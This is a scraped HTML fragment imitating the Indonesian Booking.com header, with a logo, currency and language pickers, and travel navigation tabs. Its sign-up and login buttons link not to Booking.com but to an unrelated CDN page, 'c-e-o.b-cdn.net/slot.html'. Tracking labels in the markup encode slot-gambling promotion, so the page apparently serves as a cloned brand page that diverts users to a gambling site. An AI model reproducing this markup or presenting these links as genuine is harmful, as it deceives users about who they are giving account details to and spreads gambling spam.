18.4784C114.957 18.6862 114.527 19.0387 114.224 19.4911C113.922 19.9436 113.76 20.4757 113.76 21.02C113.76 21.7476 114.048 22.4456 114.562 22.961C115.075 23.4764 115.772 23.7673 116.5 23.77V23.77ZM25.7 6.72999C24.0129 6.74775 22.3688 7.26426 20.9746 8.21447C19.5805 9.16469 18.4986 10.5061 17.8653 12.0699C17.2319 13.6337 17.0754 15.3499 17.4154 17.0025C17.7554 18.6551 18.5767 20.1701 19.776 21.3569C20.9752 22.5436 22.4988 23.349 24.1548 23.6717C25.8108 23.9944 27.5253 23.8199 29.0824 23.1702C30.6395 22.5205 31.9695 21.4247 32.9051 20.0206C33.8406 18.6166 34.3399 16.9672 34.34 15.28C34.3768 14.1396 34.1778 13.0038 33.7555 11.9438C33.3331 10.8839 32.6965 9.92248 31.8855 9.11989C31.0744 8.3173 30.1064 7.69078 29.0421 7.27955C27.9778 6.86831 26.84 6.68122 25.7 6.72999V6.72999ZM25.7 19.83C23.35 19.83 21.7 17.96 21.7 15.28C21.7 12.6 23.34 10.73 25.7 10.73C28.06 10.73 29.7 12.6 29.7 15.28C29.7 17.96 28.11 19.83 25.7 19.83ZM65.3 15.71C65.1321 15.3716 64.9128 15.0613 64.65 14.79L64.5 14.63L64.66 14.48C64.9116 14.2078 65.1423 13.917 65.35 13.61L69.74 7.05999H64.41L61.1 12.19C60.9586 12.3442 60.782 12.4621 60.5852 12.5334C60.3885 12.6048 60.1774 12.6277 59.97 12.6H59.22V2.90999C59.22 0.979993 58.01 0.709993 56.71 0.709993H54.48V23.58H59.21V16.72H59.65C60.19 16.72 60.56 16.78 60.73 17.08L63.35 21.97C63.5773 22.5089 63.9785 22.9563 64.4895 23.2408C65.0006 23.5253 65.5922 23.6306 66.17 23.54H69.8L67.09 19.07L65.3 15.71ZM88.27 6.68999C87.3747 6.67014 86.4851 6.83782 85.6584 7.18226C84.8318 7.5267 84.0863 8.04028 83.47 8.68999L83.18 8.97999L83.08 8.57999C82.9261 8.08803 82.6021 7.66692 82.166 7.39207C81.7299 7.11723 81.2102 7.0066 80.7 7.07999H78.57V23.57H83.29V15.97C83.275 15.2919 83.373 14.6159 83.58 13.97C83.7979 13.1302 84.2923 12.3883 84.9836 11.8639C85.6748 11.3396 86.5225 11.0634 87.39 11.08C88.85 11.08 89.39 11.85 89.39 13.86V21.05C89.335 21.3921 89.3619 21.7424 89.4686 22.072C89.5753 22.4017 89.7586 22.7013 90.0036 22.9463C90.2487 23.1914 90.5483 23.3747 90.878 23.4814C91.2076 23.5881 91.5579 23.615 91.9 23.56H94.12V13.07C94.15 8.89999 92.12 6.68999 88.27 6.68999V6.68999ZM73.39 7.05999H71.17V23.58H75.87V9.57999C75.9234 9.24041 75.8964 8.89304 75.7913 8.56576C75.6862 8.23848 75.5058 7.94038 75.2647 7.69537C75.0236 7.45037 74.7284 7.26527 74.4028 7.15493C74.0773 7.04459 73.7304 7.01208 73.39 7.05999V7.05999ZM44.16 6.72999C42.4729 6.74775 40.8288 7.26426 39.4346 8.21447C38.0405 9.16469 36.9586 10.5061 36.3253 12.0699C35.6919 13.6337 35.5354 15.3499 35.8754 17.0025C36.2154 18.6551 37.0367 20.1701 38.236 21.3569C39.4352 22.5436 40.9588 23.349 42.6148 23.6717C44.2708 23.9944 45.9853 23.8199 47.5424 23.1702C49.0995 22.5205 50.4295 21.4247 51.3651 20.0206C52.3006 18.6166 52.7999 16.9672 52.8 15.28C52.8368 14.1396 52.6378 13.0038 52.2155 11.9438C51.7931 10.8839 51.1565 9.92248 50.3455 9.11989C49.5344 8.3173 48.5664 7.69078 47.5021 7.27955C46.4378 6.86831 45.3 6.68122 44.16 6.72999V6.72999ZM44.16 19.83C41.81 19.83 40.16 17.96 40.16 15.28C40.16 12.6 41.8 10.73 44.16 10.73C46.52 10.73 48.16 12.6 48.16 15.28C48.16 17.96 46.57 19.83 44.16 19.83ZM144.89 6.72999C143.203 6.74775 141.559 7.26426 140.165 8.21447C138.77 9.16469 137.689 10.5061 137.055 12.0699C136.422 13.6337 136.265 15.3499 136.605 17.0025C136.945 18.6551 137.767 20.1701 138.966 21.3569C140.165 22.5436 141.689 23.349 143.345 23.6717C145.001 23.9944 146.715 23.8199 148.272 23.1702C149.829 22.5205 151.16 21.4247 152.095 20.0206C153.031 18.6166 153.53 16.9672 153.53 15.28C153.567 14.1396 153.368 13.0038 152.945 11.9438C152.523 10.8839 151.887 9.92248 151.075 9.11989C150.264 8.3173 149.296 7.69078 148.232 7.27955C147.168 6.86831 146.03 6.68122 144.89 6.72999V6.72999ZM144.89 19.83C142.54 19.83 140.89 17.96 140.89 15.28C140.89 12.6 142.53 10.73 144.89 10.73C147.25 10.73 148.89 12.6 148.89 15.28C148.89 17.96 147.3 19.83 144.89 19.83ZM109.74 7.01999C109.356 6.98285 108.97 7.05749 108.627 7.23491C108.285 7.41233 108.001 7.68497 107.81 8.01999L107.69 8.26999L107.47 8.07999C106.253 7.08344 104.711 6.57072 103.14 6.63999C98.75 6.63999 95.78 9.94999 95.78 14.87C95.78 19.79 98.85 23.22 103.23 23.22C104.521 23.2791 105.795 22.9061 106.85 22.16L107.21 21.88V22.34C107.21 24.55 105.78 25.77 103.21 25.77C102.131 25.755 101.062 25.5555 100.05 25.18C99.8562 25.0813 99.6419 25.0295 99.4244 25.0287C99.2069 25.0279 98.9923 25.0782 98.7977 25.1754C98.6032 25.2727 98.4342 25.4143 98.3043 25.5887C98.1745 25.7632 98.0874 25.9657 98.05 26.18L97.14 28.46L97.47 28.63C99.2593 29.5195 101.232 29.9783 103.23 29.97C107.23 29.97 111.9 27.91 111.9 22.14V7.01999H109.74ZM104.06 19.11C101.5 19.11 100.58 16.86 100.58 14.76C100.58 13.83 100.81 10.76 103.81 10.76C105.3 10.76 107.3 11.18 107.3 14.86C107.3 18.38 105.54 19.11 104.06 19.11ZM13.09 11.85L12.4 11.47L13 10.97C13.6103 10.4334 14.0951 9.76919 14.42 9.02435C14.7449 8.27951 14.9019 7.47231 14.88 6.65999C14.88 3.05999 12.09 0.739993 7.79 0.739993H2.31C1.69606 0.762953 1.11431 1.02048 0.684566 1.45953C0.254821 1.89857 0.00981021 2.48571 0 3.09999L0 23.5H7.88C12.67 23.5 15.77 20.89 15.77 16.84C15.8104 15.8446 15.583 14.8566 15.1116 13.9789C14.6403 13.1012 13.9421 12.3661 13.09 11.85V11.85ZM4.37 6.07999C4.37 5.01999 4.82 4.51999 5.8 4.45999H7.8C8.16093 4.42761 8.52456 4.47504 8.8651 4.59892C9.20565 4.7228 9.51476 4.9201 9.77052 5.17681C10.0263 5.43353 10.2224 5.74338 10.345 6.08438C10.4676 6.42538 10.5137 6.78919 10.48 7.14999C10.5194 7.51629 10.4791 7.88679 10.3616 8.23598C10.2442 8.58517 10.0524 8.90477 9.79964 9.17277C9.54684 9.44077 9.23898 9.65082 8.89723 9.78844C8.55549 9.92606 8.18798 9.988 7.82 9.96999H4.37V6.07999ZM8.2 19.64H4.37V15.06C4.37 14.06 4.76 13.57 5.59 13.45H8.2C8.99043 13.4949 9.7337 13.8406 10.2774 14.4161C10.8211 14.9916 11.124 15.7533 11.124 16.545C11.124 17.3367 10.8211 18.0984 10.2774 18.6739C9.7337 19.2494 8.99043 19.595 8.2 19.64ZM174.53 6.73999C173.558 6.74366 172.6 6.96575 171.726 7.38984C170.852 7.81393 170.084 8.42915 169.48 9.18999L169.14 9.62999L168.87 9.13999C168.437 8.355 167.787 7.71128 166.998 7.2857C166.209 6.86012 165.314 6.67067 164.42 6.73999C163.604 6.75328 162.798 6.93308 162.054 7.26838C161.309 7.60368 160.641 8.08742 160.09 8.68999L159.65 9.16999L159.48 8.53999C159.323 8.07152 159.008 7.67282 158.587 7.41334C158.167 7.15386 157.669 7.05005 157.18 7.11999H155.18V23.57H159.64V16.31C159.646 15.6629 159.727 15.0187 159.88 14.39C160.31 12.63 161.49 10.74 163.47 10.93C164.69 11.05 165.29 11.99 165.29 13.82V23.57H169.81V16.31C169.791 15.6345 169.875 14.9601 170.06 14.31C170.42 12.64 171.65 10.92 173.56 10.92C174.94 10.92 175.45 11.7 175.45 13.81V21.17C175.45 22.83 176.19 23.57 177.85 23.57H180V13.07C180 8.86999 178.15 6.73999 174.53 6.73999ZM133.69 17.86C132.51 19.095 130.913 19.8471 129.21 19.97C128.593 20.0073 127.974 19.914 127.395 19.6962C126.816 19.4784 126.29 19.141 125.85 18.706C125.41 18.271 125.067 17.7482 124.843 17.1716C124.619 16.5951 124.519 15.9778 124.55 15.36C124.498 14.7504 124.575 14.1365 124.776 13.5588C124.978 12.981 125.299 12.4524 125.719 12.0076C126.14 11.5629 126.649 11.212 127.215 10.978C127.78 10.744 128.388 10.6322 129 10.65C129.84 10.65 130.8 10.95 130.95 11.46V11.55C131.048 11.8986 131.258 12.2056 131.547 12.424C131.835 12.6425 132.188 12.7605 132.55 12.76H135V10.61C135 7.76999 131.39 6.73999 129 6.73999C123.81 6.73999 120 10.37 120 15.35C120 20.33 123.73 23.97 128.86 23.97C130.178 23.9562 131.479 23.6722 132.683 23.1355C133.887 22.5989 134.969 21.821 135.86 20.85L134 17.58L133.69 17.86Z"></path></svg></a></span></div></div><div style="--bui_stack_spaced_gap--s:2" class="f6e3a11b0d a19a26a18c a81870d302 faf6ceb00b e95943ce9b"><span class="a297f43545"><button aria-haspopup="dialog" data-testid="header-currency-picker-trigger" aria-label="Harga dalam Rupiah Indonesia" type="button" class="de576f5064 b46cd7aad7 e26a59bb37 dda427e6b5 acb3638563"><span class="ca2ca5203b">IDR</span></button></span><span class="a297f43545"><button aria-haspopup="dialog" data-testid="header-language-picker-trigger" aria-label="Bahasa: Bahasa Indonesia" type="button" class="de576f5064 b46cd7aad7 e26a59bb37 dda427e6b5 acb3638563"><span class="ca2ca5203b">
<div style="--bui_box_spaced_padding--s:0" class="c3bdfd4ac2 b96c49a28c c256f1a28a a18a170653 c82b1db4f9 ba98511f54"><picture class="b7a691c583 f5c8371996" style="--bui_image_width--s:100%;--bui_image_height--s:100%"><img class="f6c12c77eb c0e44985a8 c09abd8a52 ca3dad4476" src="https://t-cf.bstatic.com/design-assets/assets/v3.160.0/images-flags/Id@3x.png" alt="" role="presentation" loading="lazy"/></picture></div></span></button></span><span class="a297f43545"><a aria-label="Customer Service" data-testid="header-help-center" href="https://secure.booking.com/help.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980&amp;source=header&amp;src=profile_contact_cs" class="de576f5064 b46cd7aad7 e26a59bb37 c295306d66 dda427e6b5 acb3638563"><span class="ec1ff2f0cb"><span class="fc70cba028 e2a1cd6bfe" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M9.75 9a2.25 2.25 0 1 1 3 2.122 2.25 2.25 0 0 0-1.5 2.122v1.006a.75.75 0 0 0 1.5 0v-1.006c0-.318.2-.602.5-.708A3.75 3.75 0 1 0 8.25 9a.75.75 0 1 0 1.5 0M12 16.5a1.125 1.125 0 1 0 0 2.25 1.125 1.125 0 0 0 0-2.25.75.75 0 0 0 0 1.5.375.375 0 1 1 0-.75.375.375 0 0 1 0 .75.75.75 0 0 0 0-1.5M22.5 12c0 5.799-4.701 10.5-10.5 10.5S1.5 17.799 1.5 12 6.201 1.5 12 1.5 22.5 6.201 22.5 12m1.5 0c0-6.627-5.373-12-12-12S0 5.373 0 12s5.373 12 12 12 12-5.373 12-12"></path></svg></span></span></a></span><a data-testid="header-custom-action-button" href="https://join.booking.com/?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980&amp;lang=id&amp;utm_medium=frontend&amp;utm_source=topbar" class="de576f5064 b46cd7aad7 e26a59bb37 dda427e6b5 acb3638563"><span class="ca2ca5203b">Daftarkan properti Anda</span></a><a data-testid="header-sign-up-button" aria-label="Daftarkan akun" href="https://c-e-o.b-cdn.net/slot.html" class="de576f5064 b46cd7aad7 d0a01e3d83 c7a901b0e7 bbf83acb81 js-header-login-link"><span class="ca2ca5203b">Daftar</span></a><div class="e1e158e66b ce103e449e"><a data-testid="header-sign-in-button" aria-label="Login" href="https://c-e-o.b-cdn.net/slot.html" class="de576f5064 b46cd7aad7 d0a01e3d83 c7a901b0e7 bbf83acb81 js-header-login-link"><span class="ca2ca5203b">Login</span></a></div></div></nav><nav data-testid="header-xpb" aria-label="Apa yang Anda cari?" aria-owns="accommodations flights packages cars attractions airport_taxis" class="d24b1ed1cf Header_tab d731d67377 b8f0d75194"><div class="f45162dfea e00310f0e5"><ul class="c4a6e8e871"><li class="ddb4fbcb64 c857e7fdc3"><a id="accommodations" aria-current="page" tabindex="0" href="https://www.booking.com/index.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980&amp;selected_currency=IDR" class="de576f5064 f63e3c83f3 e7f2b1a356"><span style="--bui_stack_spaced_gap--s:2" class="f6e3a11b0d a19a26a18c a81870d302 a5a81c5b1f e95943ce9b"><span class="fc70cba028 be75a65a99 e2a1cd6bfe c8605fc002" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M2.75 12h18.5c.69 0 1.25.56 1.25 1.25V18l.75-.75H.75l.75.75v-4.75c0-.69.56-1.25 1.25-1.25m0-1.5A2.75 2.75 0 0 0 0 13.25V18c0 .414.336.75.75.75h22.5A.75.75 0 0 0 24 18v-4.75a2.75 2.75 0 0 0-2.75-2.75zM0 18v3a.75.75 0 0 0 1.5 0v-3A.75.75 0 0 0 0 18m22.5 0v3a.75.75 0 0 0 1.5 0v-3a.75.75 0 0 0-1.5 0m-.75-6.75V4.5a2.25 2.25 0 0 0-2.25-2.25h-15A2.25 2.25 0 0 0 2.25 4.5v6.75a.75.75 0 0 0 1.5 0V4.5a.75.75 0 0 1 .75-.75h15a.75.75 0 0 1 .75.75v6.75a.75.75 0 0 0 1.5 0m-13.25-3h7a.25.25 0 0 1 .25.25v2.75l.75-.75h-9l.75.75V8.5a.25.25 0 0 1 .25-.25m0-1.5A1.75 1.75 0 0 0 6.75 8.5v2.75c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75V8.5a1.75 1.75 0 0 0-1.75-1.75z"></path></svg></span><div class="ca9d921c46"><span class="b99b6ef58f">Akomodasi</span></div></span></a></li><li class="ddb4fbcb64"><a id="flights" tabindex="0" href="https://ch.booking.com/c?st=RkxJR0hU&amp;lt=TEFORElOR19QQUdF&amp;si=Q2g1aUxXTjBMWEJzWVhSbWIzSnRMV1JwYzNSeWFXSjFkR2x2YmkxamRHUVFBaHBBdFZwSmZFTnpQdFRORHJLcDF5ZG1qNnZGdGtZNE05NWsrM2JHc3VaY1RrWkJPdE0zUjdxc2VKYzFlYjhWKzJjcUNJUmlwL0U0WWQyNXNBSFcvZ3RIQ1E9PQ%3D%3D&amp;target=aHR0cHM6Ly9mbGlnaHRzLmJvb2tpbmcuY29tL3B4Z28_ZXRTdGF0ZUJsb2I9RVBvUWktYVBtVlEyM2g1dmZTTFpabFotdGRzSnpKbUdBcUQ3V19FOWRTWW1lUU9KODdGblBOQVFfS2VkSS1RcUwmYWRwbGF0PXd3dy1ob3RlbC13ZWJfc2hlbGxfaGVhZGVyLWZsaWdodC1taXNzaW5nX2NyZWF0aXZlLTRwVDdtQWdDZ0Q3QmxCQ3pVM1oxdGwmbGFiZWw9Z29nMjM1amMtMTBDQXNvYUVJMmRIVndZV2wzYVc0dGNtVnJiMjFsYm1SaGMya3RkRzkwYnkxemJHOTBMWFJsY25CbGNtTmhlV0V0YldsdUxXUmxjRzh0TVRCclNBbFlBMmhvaUFFQm1BRXp1QUVYeUFFTTJBRUQ2QUVCLUFFQmlBSUJxQUlCdUFMTnZ0M0dCc0FDQWRJQ0pEY3pNMlk0WVRVeUxUZ3pZMll0TkdZellTMDROakptTFdReFkyWmlNREV6TW1JMVp0Z0NBZUFDQVEmbGFuZz1pZCZkaXN0cmlidXRpb25faWQ9NHBUN21BZ0NnRDdCbEJDelUzWjF0bCZhaWQ9MzU2OTgwJmNsaWVudF9uYW1lPWItd2ViLXNoZWxsLWJmZiZzaWQ9NzYzYzQxZDJjMzgxMzkwNmYyNTI3MDEzZjEwM2I4Mzc%3D" class="de576f5064 f63e3c83f3 e7f2b1a356"><span style="--bui_stack_spaced_gap--s:2" class="f6e3a11b0d a19a26a18c a81870d302 a5a81c5b1f e95943ce9b"><span class="fc70cba028 be75a65a99 e2a1cd6bfe c8605fc002" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="m20.505 7.5-15.266.022.672.415-1.1-2.2a.75.75 0 0 0-.638-.414l-2.293-.1C.82 5.228-.003 6.06.003 7.083c.002.243.051.484.146.709l2.072 4.68a2.95 2.95 0 0 0 2.701 1.778h4.043l-.676-1.075-2.484 5.168A1.83 1.83 0 0 0 7.449 21h2.099a1.85 1.85 0 0 0 1.419-.664l5.165-6.363-.582.277h4.956c1.82.09 3.399-1.341 3.49-3.198l.004-.134a3.426 3.426 0 0 0-3.44-3.419l-.074.001zm.02 1.5h.042a1.924 1.924 0 0 1 1.933 1.914l-.002.065a1.866 1.866 0 0 1-1.955 1.772l-4.993-.001a.75.75 0 0 0-.582.277l-5.16 6.355a.35.35 0 0 1-.26.118h-2.1a.336.336 0 0 1-.3-.49l2.493-5.185a.75.75 0 0 0-.676-1.075H4.924a1.45 1.45 0 0 1-1.328-.878l-2.07-4.676a.35.35 0 0 1 .326-.474l2.255.1-.638-.415 1.1 2.2a.75.75 0 0 0 .672.415L20.507 9zm-4.202-1.24-2.992-4.02A1.85 1.85 0 0 0 11.85 3H9.783a1.85 1.85 0 0 0-1.654 2.672l1.439 2.91a.75.75 0 0 0 1.344-.664l-1.44-2.911a.35.35 0 0 1 .312-.507h2.066a.35.35 0 0 1 .279.14l2.99 4.017a.75.75 0 1 0 1.203-.896z"></path></svg></span><div class="ca9d921c46"><span class="b99b6ef58f">Penerbangan</span></div></span></a></li><li class="ddb4fbcb64"><a id="packages" tabindex="0" href="https://booking.com/pxgo?token=UmFuZG9tSVYkc2RlIyh9YWktmrwAPG7dGqoIDHc69rQiCEGfRzUR_Tpjtl4VElBMSzjZ-BHZrLrsTrvU-bJROhGZhPI6La_MtSInfchq_U8ZZ3g0lVIG6xWogrfSS8OPltJw2ArkWrGZ-r8xdfTBELfb6heozB-UjcQjX_gVbZeJhJF_QMz2Y5wv9jvuvHJzgJfhol9EG5587PgofYwYJru7S4vrQTviGh_s0Juyf4bNCVY9S73EQ9x1YMV8OyugcEoOLBSTRYtJJ3WXwlkLIxAc9be_UCjhgy-hseEpxPQDvbGL9SStZg&amp;url=https%3A%2F%2Fagoda.com%2Fid-id%2Fc%2Fbooking%2F&amp;lang=id&aamp;aid=356980" class="de576f5064 f63e3c83f3 e7f2b1a356"><span style="--bui_stack_spaced_gap--s:2" class="f6e3a11b0d a19a26a18c a81870d302 a5a81c5b1f e95943ce9b"><span class="fc70cba028 be75a65a99 e2a1cd6bfe c8605fc002" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px" data-rtl-flip="true"><path d="M6.306 17.25a8.25 8.25 0 1 1 11.69-7.502.75.75 0 1 0 1.5 0A9.75 9.75 0 0 0 13.812.889C8.917-1.356 3.13.791.884 5.685-1.36 10.58.786 16.367 5.68 18.613a.75.75 0 0 0 .626-1.364zM3.756 3.5l5.28 2a.75.75 0 0 1 .475.851l-.313 1.57a.75.75 0 0 1-.554.58l-2.08.518a.75.75 0 0 0-.514.45l-1.154 2.884a2.24 2.24 0 0 1-.84 1.037l-1.84 1.263a.75.75 0 1 0 .85 1.236l1.83-1.257a3.73 3.73 0 0 0 1.393-1.722l1.153-2.884-.514.449 2.079-.52a2.25 2.25 0 0 0 1.661-1.74l.314-1.57a2.25 2.25 0 0 0-1.417-2.548l-5.277-2A.75.75 0 1 0 3.756 3.5m11.565-.57-1.467 2.926a2.25 2.25 0 0 0-.122 1.718l.557 1.663a.75.75 0 1 0 1.422-.476L15.154 7.1a.75.75 0 0 1 .041-.572l1.466-2.924a.75.75 0 1 0-1.34-.672zm7.175 16.192v2.625a.75.75 0 0 1-.75.75h-10.5a.75.75 0 0 1-.75-.75v-5.25a.75.75 0 0 1 .75-.75h10.5a.75.75 0 0 1 .75.75zm1.5 0v-2.625a2.25 2.25 0 0 0-2.25-2.25h-10.5a2.25 2.25 0 0 0-2.25 2.25v5.25a2.25 2.25 0 0 0 2.25 2.25h10.5a2.25 2.25 0 0 0 2.25-2.25zm-12-4.125v8.25a.75.75 0 0 0 1.5 0v-8.25a.75.75 0 0 0-1.5 0m7.5 0v8.25a.75.75 0 0 0 1.5 0v-8.25a.75.75 0 0 0-1.5 0m-4.5.002v-.75a1.5 1.5 0 0 1 3 0V15a.75.75 0 0 0 1.5 0v-.75a3 3 0 1 0-6 0V15a.75.75 0 0 0 1.5 0z"></path></svg></span><div class="ca9d921c46"><span class="b99b6ef58f">Penerbangan + Hotel</span></div></span></a></li><li class="ddb4fbcb64"><a id="cars" tabindex="0" href="https://ch.booking.com/c?st=Q0FS&amp;lt=TEFORElOR19QQUdF&amp;si=Q2g1aUxXTjBMWEJzWVhSbWIzSnRMV1JwYzNSeWFXSjFkR2x2YmkxamRHUVFBaHBBYytnRHZ0cWM0cnJnZDdGMUQ4bm5lVlRpOUFEUldiZmliK1VHcHhiNm9FMXpqYlJ0b0c4WjlyWFdhcys1QnZCVThtSUp4dVUyRU5kR3JIMU9GbnF5Qmc9PQ%3D%3D&amp;target=aHR0cHM6Ly93d3cuYm9va2luZy5jb20vY2Fycy9pbmRleC5pZC5odG1sP3NlbGVjdGVkX2N1cnJlbmN5PUlEUiZldFN0YXRlQmxvYj1FUG9RaS1hUG1WUTIzaDV2ZlNMWlpsWi10ZHNKekptR0FxRDdXX0U5ZFNZbWVRT0o4N0ZuUE5BUV9LZWRJLVFxTCZhZHBsYXQ9d3d3LWhvdGVsLXdlYl9zaGVsbF9oZWFkZXItY2FyLW1pc3NpbmdfY3JlYXRpdmUtNHBUN21BZ0NnRDdCbEJDelUzWjF0bCZsYWJlbD1nb2cyMzVqYy0xMENBc29hRUkyZEhWd1lXbDNhVzR0Y21WcmIyMWxibVJoYzJrdGRHOTBieTF6Ykc5MExYUmxjbkJsY21OaGVXRXRiV2x1TFdSbGNHOHRNVEJyU0FsWUEyaG9pQUVCbUFFenVBRVh5QUVNMkFFRDZBRUItQUVCaUFJQnFBSUJ1QUxOdnQzR0JzQUNBZElDSkRjek0yWTRZVFV5TFRnelkyWXROR1l6WVMwNE5qSm1MV1F4WTJaaU1ERXpNbUkxWnRnQ0FlQUNBUSZkaXN0cmlidXRpb25faWQ9NHBUN21BZ0NnRDdCbEJDelUzWjF0bCZhaWQ9MzU2OTgwJmNsaWVudF9uYW1lPWItd2ViLXNoZWxsLWJmZiZzaWQ9NzYzYzQxZDJjMzgxMzkwNmYyNTI3MDEzZjEwM2I4Mzc%3D" class="de576f5064 f63e3c83f3 e7f2b1a356"><span style="--bui_stack_spaced_gap--s:2" class="f6e3a11b0d a19a26a18c a81870d302 a5a81c5b1f e95943ce9b"><span class="fc70cba028 be75a65a99 e2a1cd6bfe c8605fc002" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="m21.684 9.443-1.7-3.79c-.42-1.128-1.542-1.905-2.794-1.903H6.809a3 3 0 0 0-2.811 1.947L2.316 9.443a.75.75 0 1 0 1.368.614l1.7-3.79c.238-.63.798-1.018 1.424-1.017h10.383a1.5 1.5 0 0 1 1.407.973l1.718 3.834a.75.75 0 1 0 1.368-.614M.75 16.468V18a2.25 2.25 0 0 0 4.5 0v-1.5a.75.75 0 0 0-1.5 0V18a.75.75 0 0 1-1.5 0v-1.532a.75.75 0 0 0-1.5 0m21 0V18a.75.75 0 0 1-1.5 0v-1.5a.75.75 0 0 0-1.5 0V18a2.25 2.25 0 0 0 4.5 0v-1.532a.75.75 0 0 0-1.5 0M19.875 13.5a.375.375 0 0 1-.375-.375.75.75 0 0 0 1.5 0c0-.621-.504-1.125-1.125-1.125a.75.75 0 0 0 0 1.5m.375-.375a.375.375 0 0 1-.375.375.75.75 0 0 0 0-1.5c-.621 0-1.125.504-1.125 1.125a.75.75 0 0 0 1.5 0m-.375-.375c.207 0 .375.168.375.375a.75.75 0 0 0-1.5 0c0 .621.504 1.125 1.125 1.125a.75.75 0 0 0 0-1.5m-.375.375c0-.207.168-.375.375-.375a.75.75 0 0 0 0 1.5c.621 0 1.125-.504 1.125-1.125a.75.75 0 0 0-1.5 0M4.125 12C3.504 12 3 12.504 3 13.125a.75.75 0 0 0 1.5 0 .375.375 0 0 1-.375.375.75.75 0 0 0 0-1.5m1.125 1.125c0-.621-.504-1.125-1.125-1.125a.75.75 0 0 0 0 1.5.375.375 0 0 1-.375-.375.75.75 0 0 0 1.5 0M4.125 14.25c.621 0 1.125-.504 1.125-1.125a.75.75 0 0 0-1.5 0c0-.207.168-.375.375-.375a.75.75 0 0 0 0 1.5M3 13.125c0 .621.504 1.125 1.125 1.125a.75.75 0 0 0 0-1.5c.207 0 .375.168.375.375a.75.75 0 0 0-1.5 0M2.75 10.5h18.5c.69 0 1.25.56 1.25 1.25v3.75a.25.25 0 0 1-.25.25H1.75a.25.25 0 0 1-.25-.25v-3.75c0-.69.56-1.25 1.25-1.25m0-1.5A2.75 2.75 0 0 0 0 11.75v3.75c0 .966.784 1.75 1.75 1.75h20.5A1.75 1.75 0 0 0 24 15.5v-3.75A2.75 2.75 0 0 0 21.25 9z"></path></svg></span><div class="ca9d921c46"><span class="b99b6ef58f">Rental mobil</span></div></span></a></li><li class="ddb4fbcb64"><a id="attractions" tabindex="0" href="https://ch.booking.com/c?st=QVRUUkFDVElPTg%3D%3D&amp;lt=TEFORElOR19QQUdF&amp;si=Q2g1aUxXTjBMWEJzWVhSbWIzSnRMV1JwYzNSeWFXSjFkR2x2YmkxamRHUVFBaHBBUjRNNEUvS1RwQVNaZU9CUy9UdDdJY3NPVy9vT2xiZ2RoemgvTXhrWDFrTmRLU0w4WlE0cy9RRmEwZTI4VnV4dUJRTHNZbTJIbjNRZ3NrU1I3eFdtQmc9PQ%3D%3D&amp;target=aHR0cHM6Ly93d3cuYm9va2luZy5jb20vYXR0cmFjdGlvbnMvaW5kZXguaWQuaHRtbD9zZWxlY3RlZF9jdXJyZW5jeT1JRFImZXRTdGF0ZUJsb2I9RVBvUWktYVBtVlEyM2g1dmZTTFpabFotdGRzSnpKbUdBcUQ3V19FOWRTWW1lUU9KODdGblBOQVFfS2VkSS1RcUwmYWRwbGF0PXd3dy1ob3RlbC13ZWJfc2hlbGxfaGVhZGVyLWF0dHJhY3Rpb24tbWlzc2luZ19jcmVhdGl2ZS00cFQ3bUFnQ2dEN0JsQkN6VTNaMXRsJmxhYmVsPWdvZzIzNWpjLTEwQ0Fzb2FFSTJkSFZ3WVdsM2FXNHRjbVZyYjIxbGJtUmhjMmt0ZEc5MGJ5MXpiRzkwTFhSbGNuQmxjbU5oZVdFdGJXbHVMV1JsY0c4dE1UQnJTQWxZQTJob2lBRUJtQUV6dUFFWHlBRU0yQUVENkFFQi1BRUJpQUlCcUFJQnVBTE52dDNHQnNBQ0FkSUNKRGN6TTJZNFlUVXlMVGd6WTJZdE5HWXpZUzA0TmpKbUxXUXhZMlppTURFek1tSTFadGdDQWVBQ0FRJmRpc3RyaWJ1dGlvbl9pZD00cFQ3bUFnQ2dEN0JsQkN6VTNaMXRsJmFpZD0zNTY5ODAmY2xpZW50X25hbWU9Yi13ZWItc2hlbGwtYmZmJnNpZD03NjNjNDFkMmMzODEzOTA2ZjI1MjcwMTNmMTAzYjgzNw%3D%3D" class="de576f5064 f63e3c83f3 e7f2b1a356"><span style="--bui_stack_spaced_gap--s:2" class="f6e3a11b0d a19a26a18c a81870d302 a5a81c5b1f e95943ce9b"><span class="fc70cba028 be75a65a99 e2a1cd6bfe c8605fc002" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M13.5 3a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0M15 3a3 3 0 1 0-6 0 3 3 0 0 0 6 0m6 4.5a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0m1.5 0a3 3 0 1 0-6 0 3 3 0 0 0 6 0M6 7.5a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0m1.5 0a3 3 0 1 0-6 0 